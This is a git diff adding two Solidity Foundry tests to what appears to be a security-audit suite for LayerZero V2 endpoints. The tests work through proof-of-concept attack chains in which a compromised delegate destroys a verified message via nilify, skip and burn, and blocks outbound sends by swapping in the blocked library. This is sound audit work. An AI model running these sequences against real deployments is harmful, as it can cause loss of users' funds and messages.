@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.0;
 
-import { Origin } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
+import { Origin, MessagingParams } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
 import { EndpointV2 } from "@layerzerolabs/lz-evm-protocol-v2/contracts/EndpointV2.sol";
 import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
 import { SetConfigParam } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/IMessageLibManager.sol";
@@ -24,6 +24,9 @@ contract AccessControlTest is AuditBase {
 
     address internal attacker = address(0xA77AC1);
     address internal oappOwner = address(0x0A99);
+
+    bytes32 internal constant EMPTY_PAYLOAD_HASH = bytes32(0);
+    bytes32 internal constant NIL_PAYLOAD_HASH = bytes32(type(uint256).max);
 
     // ==================== AV5.1: Delegate Full Power ====================
 
@@ -263,6 +266,100 @@ contract AccessControlTest is AuditBase {
         emit log("2. Delegate swaps DVN set + zeros confirmations");
         emit log("3. Malicious DVN re-verifies with different payload");
         emit log("4. Re-commit overwrites legitimate hash -> PERMANENT FUND LOSS");
+    }
+
+    // ==================== AV5.7: Delegate nilify->skip->burn Permanently Destroys Verified Message ====================
+    /// @dev CRITICAL: A compromised delegate can permanently destroy a verified message using
+    ///      a chain of nilify -> skip -> burn. After burn, the nonce is permanently unexecutable
+    ///      and un-verifiable: lazyInboundNonce has advanced past it and the hash is EMPTY.
+    function test_AV5_7_DelegateNilifySkipBurn_PermanentDestruction() public {
+        address delegate = address(0xDE1E);
+        dstEndpoint.setDelegate(delegate);
+
+        // Step 1: Legitimate message verified and committed at nonce 1
+        Packet memory packet = _makePacket(1, address(this), address(this), "legit_msg");
+        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);
+        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);
+        _commitVerification(dstReceiveUln, header, payloadHash);
+
+        // Step 2: Verify the inboundPayloadHash is stored correctly
+        bytes32 senderBytes32 = bytes32(uint256(uint160(address(this))));
+        bytes32 storedHash = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
+        assertEq(storedHash, payloadHash, "Payload hash should be stored after commit");
+        assertTrue(storedHash != EMPTY_PAYLOAD_HASH, "Hash must be non-empty before attack");
+
+        // Step 3: Delegate calls nilify -- sets nonce 1 to NIL_PAYLOAD_HASH
+        vm.prank(delegate);
+        dstEndpoint.nilify(address(this), SRC_EID, senderBytes32, 1, storedHash);
+
+        bytes32 afterNilify = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
+        assertEq(afterNilify, NIL_PAYLOAD_HASH, "Hash should be NIL after nilify");
+
+        // Step 4: Delegate calls skip(nonce=2)
+        // inboundNonce is 1 because nonce 1 has NIL hash (non-zero), so inboundNonce + 1 == 2
+        vm.prank(delegate);
+        dstEndpoint.skip(address(this), SRC_EID, senderBytes32, 2);
+
+        // Step 5: Delegate calls burn(nonce=1, NIL_PAYLOAD_HASH)
+        // nonce 1 <= lazyInboundNonce 2, and hash is NIL (non-zero) -- conditions satisfied
+        vm.prank(delegate);
+        dstEndpoint.burn(address(this), SRC_EID, senderBytes32, 1, NIL_PAYLOAD_HASH);
+
+        // Step 6: Verify the hash is now EMPTY (deleted)
+        bytes32 afterBurn = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
+        assertEq(afterBurn, EMPTY_PAYLOAD_HASH, "Hash must be EMPTY after burn");
+
+        // Step 7: Verify nonce 1 can never be re-verified
+        // lazyInboundNonce == 2, nonce 1 <= 2, and hash == EMPTY -> permanently destroyed
+        uint64 lazy = dstEndpoint.lazyInboundNonce(address(this), SRC_EID, senderBytes32);
+        assertEq(lazy, 2, "lazyInboundNonce should be 2 after skip");
+        assertTrue(1 <= lazy, "Nonce 1 is at or below lazyInboundNonce -- cannot be re-verified");
+        assertEq(afterBurn, EMPTY_PAYLOAD_HASH, "Nonce 1 hash is EMPTY -- re-verify would write into already-consumed slot");
+
+        emit log("CONFIRMED: Delegate nilify->skip->burn permanently destroys verified message");
+        emit log("1. Legitimate message committed at nonce 1");
+        emit log("2. Delegate nilify: hash set to NIL_PAYLOAD_HASH");
+        emit log("3. Delegate skip(2): lazyInboundNonce advanced to 2");
+        emit log("4. Delegate burn(1): nonce 1 hash deleted -- EMPTY, nonce <= lazyInboundNonce");
+        emit log("5. Nonce 1 is permanently unexecutable and un-verifiable -- FUND LOSS");
+    }
+
+    // ==================== AV5.8: Delegate SendLib Swap Blocks Outbound ====================
+    /// @dev CRITICAL: A compromised delegate can block all outbound messages by swapping
+    ///      the send library to the blockedLibrary. Any subsequent send() call reverts.
+    function test_AV5_8_DelegateSendLibSwap_BlocksOutbound() public {
+        address delegate = address(0xDE1E);
+
+        // Step 1: Set up delegate for address(this) as OApp on srcEndpoint
+        srcEndpoint.setDelegate(delegate);
+
+        // Step 2: Get the blockedLibrary address
+        address blocked = srcEndpoint.blockedLibrary();
+        assertTrue(blocked != address(0), "blockedLibrary must be set");
+
+        // Step 3: Delegate swaps send library to blockedLibrary
+        vm.prank(delegate);
+        srcEndpoint.setSendLibrary(address(this), DST_EID, blocked);
+
+        // Verify the send library is now the blocked one
+        address activeSendLib = srcEndpoint.getSendLibrary(address(this), DST_EID);
+        assertEq(activeSendLib, blocked, "Send library should now be blockedLibrary");
+
+        // Step 4: Attempt to send a message -- must revert
+        vm.deal(address(this), 10 ether);
+        MessagingParams memory params = MessagingParams({
+            dstEid: DST_EID,
+            receiver: bytes32(uint256(uint160(address(this)))),
+            message: "blocked",
+            options: "",
+            payInLzToken: false
+        });
+        vm.expectRevert();
+        srcEndpoint.send{value: 1 ether}(params, address(this));
+
+        emit log("CONFIRMED: Delegate can block all outbound messages via library swap");
+        emit log("1. Delegate swaps send library to blockedLibrary for the OApp");
+        emit log("2. All subsequent send() calls revert -- outbound permanently blocked");
     }
 
     // ==================== Helpers ====================
